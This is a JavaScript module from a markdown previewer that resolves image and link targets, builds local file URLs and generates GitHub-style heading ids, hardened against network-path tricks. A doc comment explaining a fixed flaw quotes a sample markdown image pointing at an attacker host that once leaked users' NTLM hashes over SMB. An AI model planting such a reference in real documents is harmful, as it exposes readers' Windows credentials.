/**
 * previewPaths.js: what the URLs inside a markdown document point at, and the ids its headings get.
 *
 * Pure string functions with no DOM, so `node --test` covers them (test/previewPaths.test.mjs).
 * markdown.js uses them for image sources and heading ids, previewLinks.js for link clicks.
 *
 * ── The input is marked's output, not the author's text ──────────────────────────────────────
 * marked percent-encodes every link and image destination (`<my file.png>` becomes
 * `my%20file.png`, `Übersicht.png` becomes `%C3%9Cbersicht.png`, a backslash becomes `%5C`) but
 * leaves an existing `%20` alone. So a destination is decoded once before it is treated as a path;
 * up to 1.13.4 images were encoded a second time instead (`%20` → `%2520`), and the main process,
 * which decodes once, looked for a file literally named `my%20file.png`.
 */

/** A Windows drive path: `C:\x` or `C:/x`. */
const DRIVE = /^[a-zA-Z]:[\\/]/;
/** A URL scheme. A drive letter looks like one (`C:`), so DRIVE is always checked first. */
const SCHEME = /^[a-zA-Z][a-zA-Z0-9+.-]*:/;
/** Two leading slashes of either kind: a protocol-relative URL, or a UNC path once decoded. */
const DOUBLE_SLASH = /^[\\/]{2}/;

/** Undo marked's percent-encoding. A stray `%` (`100%.png`) is not an escape, so keep it as written. */
export function decodePath(s) {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

/**
 * Drop a `?query` and/or `#hash` (`diagram.svg?raw=true`, `guide.md#install`). Done on the ENCODED
 * text, before decodePath: a file whose name really contains `#` or `?` is written `%23` / `%3F`,
 * and must survive as part of the name.
 */
export function stripQueryAndHash(s) {
  const cut = s.search(/[?#]/);
  return cut === -1 ? s : s.slice(0, cut);
}

/** The folder part of a document path (either separator). */
export function dirOf(docPath) {
  return docPath.slice(0, Math.max(docPath.lastIndexOf('/'), docPath.lastIndexOf('\\')));
}

const isWindowsPath = (p) => DRIVE.test(p) || p.startsWith('\\');

/**
 * `path` with `.` and `..` collapsed, never climbing above its root (`/`, `C:` or a UNC
 * `//server/share`). Windows paths come back with backslashes, the form the rest of FATE (tab
 * de-duplication, recent files) compares against.
 */
function normalize(path, windows) {
  let rest = path.replace(/\\/g, '/');
  let root = '';
  const unc = /^\/\/[^/]+\/[^/]+/.exec(rest);
  const drive = /^[a-zA-Z]:/.exec(rest);
  if (unc) root = unc[0];
  else if (drive) root = drive[0];
  rest = rest.slice(root.length);
  const segments = [];
  for (const seg of rest.split('/')) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') segments.pop();
    else segments.push(seg);
  }
  const out = `${root}/${segments.join('/')}`;
  return windows ? out.replace(/\//g, '\\') : out;
}

/**
 * An absolute path for `file` (already decoded) as seen from the document at `docPath`. Absolute
 * `file`s stay absolute; on Windows a leading `/` means the root of the document's drive.
 * Returns null when there is nothing to resolve against.
 */
export function resolveAgainstDoc(file, docPath) {
  const windows = (docPath ? isWindowsPath(docPath) : false) || DRIVE.test(file);
  if (DRIVE.test(file)) return normalize(file, true);
  if (file.startsWith('/') || file.startsWith('\\')) {
    if (!windows) return normalize(file, false);
    const drive = docPath && /^[a-zA-Z]:/.exec(docPath);
    // A rooted path under a UNC document has no drive to hang off; leave it unresolved.
    return drive ? normalize(drive[0] + file, true) : null;
  }
  if (!docPath) return null;
  return normalize(`${dirOf(docPath)}/${file}`, windows);
}

/** `host` of a web URL, for the remote-image placeholder; '' when it doesn't parse. */
export function hostOf(url) {
  try {
    return new URL(url).host;
  } catch {
    return '';
  }
}

/**
 * Where an <img src> (as it stands after sanitising) points:
 *   { kind: 'none' }                       empty
 *   { kind: 'data' }                       inline data: URI, shown as is
 *   { kind: 'local', path }                a file on disk (absolute, decoded)
 *   { kind: 'remote', url, host }          the internet; `url` is what to load if allowed
 *   { kind: 'blocked', host }              a network share or another scheme: never loaded
 *   { kind: 'unresolved' }                 relative, but the document has no path
 *
 * ── `//host/x` is REMOTE, never local (C5) ───────────────────────────────────────────────────
 * Up to 1.13.4 a leading `/` meant "absolute local path", so `![](//attacker.example/share/x.png)`
 * became fate-local://local//attacker.example/…, which the main process fetched as
 * file://attacker.example/share/x.png: an SMB connection on Windows, handing over the user's NTLM
 * hash just for opening the document. A protocol-relative URL now means https (what GitHub does).
 * A decoded `\\server\share` path is a network share outright, and is never loaded at all.
 *
 * A plain `http:` image is loaded as https, the way Chromium upgrades images on secure pages; the
 * renderer's Content-Security-Policy (vite.config.js) admits https images only.
 */
export function classifyImageSrc(src, docPath) {
  const s = (src || '').trim();
  if (!s) return { kind: 'none' };
  if (/^data:/i.test(s)) return { kind: 'data' };
  if (/^https:/i.test(s)) return { kind: 'remote', url: s, host: hostOf(s) };
  if (/^http:/i.test(s)) {
    const url = `https:${s.slice(5)}`;
    return { kind: 'remote', url, host: hostOf(url) };
  }
  if (s.startsWith('//')) {
    const url = `https:${s}`;
    return { kind: 'remote', url, host: hostOf(url) };
  }
  const file = decodePath(stripQueryAndHash(s));
  if (DOUBLE_SLASH.test(file)) return { kind: 'blocked', host: file.slice(2).split(/[\\/]/)[0] };
  if (!DRIVE.test(file) && SCHEME.test(file)) return { kind: 'blocked', host: '' };
  const path = resolveAgainstDoc(file, docPath);
  return path ? { kind: 'local', path } : { kind: 'unresolved' };
}

/**
 * fate-local://local/<absolute path, each segment encoded>. The fixed `local` host is
 * load-bearing: fate-local is a STANDARD scheme (main.cjs registerSchemesAsPrivileged), and
 * Chromium canonicalises `scheme:///C:/x` for standard schemes by collapsing the empty authority,
 * so the old `fate-local:///C:/Users/…` became host `c`, path `/Users/…`, and every local image
 * 404'd while the src attribute still looked right. Encoding each segment keeps `#`, `?` and `%` in
 * file names from being read as URL syntax; the main process decodes once.
 */
export function toFateLocalUrl(absPath) {
  const p = absPath.replace(/\\/g, '/');
  const rooted = p.startsWith('/') ? p : `/${p}`;
  return `fate-local://local${rooted.split('/').map(encodeURIComponent).join('/')}`;
}

/**
 * What clicking a link with this `href` (the raw attribute) should do:
 *   { kind: 'fragment', fragment }          scroll within the same preview (decoded, no '#')
 *   { kind: 'file', path, fragment }        open a file as a tab (absolute path)
 *   { kind: 'external', url }               http(s) or mailto: hand to the system
 *   { kind: 'ignore' }                      anything else
 *
 * Network paths (`//host/x`, `\\server\share`) are ignored like other schemes: a document must
 * not be able to make FATE open a file from a machine the user never chose (see C5).
 */
export function resolveLinkTarget(href, docPath) {
  const h = (href || '').trim();
  if (!h) return { kind: 'ignore' };
  if (h.startsWith('#')) return { kind: 'fragment', fragment: decodePath(h.slice(1)) };
  if (/^(https?|mailto):/i.test(h)) return { kind: 'external', url: h };
  const hashAt = h.indexOf('#');
  const fragment = hashAt === -1 ? '' : decodePath(h.slice(hashAt + 1));
  const file = decodePath(stripQueryAndHash(h));
  if (!file) return fragment ? { kind: 'fragment', fragment } : { kind: 'ignore' }; // `?x#y`
  if (DOUBLE_SLASH.test(file)) return { kind: 'ignore' };
  if (!DRIVE.test(file) && SCHEME.test(file)) return { kind: 'ignore' };
  const path = resolveAgainstDoc(file, docPath);
  return path ? { kind: 'file', path, fragment } : { kind: 'ignore' };
}

/**
 * GitHub's heading anchors, the github-slugger algorithm: lower-case, drop everything that isn't a
 * letter, mark, digit, `_`, `-` or space, then turn each space into `-`. So `## Hello, World!` is
 * #hello-world, `## Über uns` is #über-uns and `## A – B` is #a--b, and links written for GitHub
 * land on the same heading here.
 */
export function slugify(text) {
  return text.toLowerCase().replace(/[^\p{L}\p{M}\p{Nd}\p{Nl}\p{Pc}\- ]/gu, '').replace(/ /g, '-');
}

/**
 * A slugger for one document: repeats get `-1`, `-2`, … exactly as on GitHub, including the
 * subtle case where a heading's own slug already took the suffixed form (`Intro 1`, `Intro`,
 * `Intro` gives intro-1, intro, intro-2). A heading with nothing sluggable in it (only emoji or
 * punctuation) gets `section`: GitHub leaves its id empty, which can't be scrolled to.
 */
export function createSlugger() {
  const occurrences = new Map();
  return (text) => {
    const original = slugify(text) || 'section';
    let slug = original;
    while (occurrences.has(slug)) {
      const n = occurrences.get(original) + 1;
      occurrences.set(original, n);
      slug = `${original}-${n}`;
    }
    occurrences.set(slug, 0);
    return slug;
  };
}
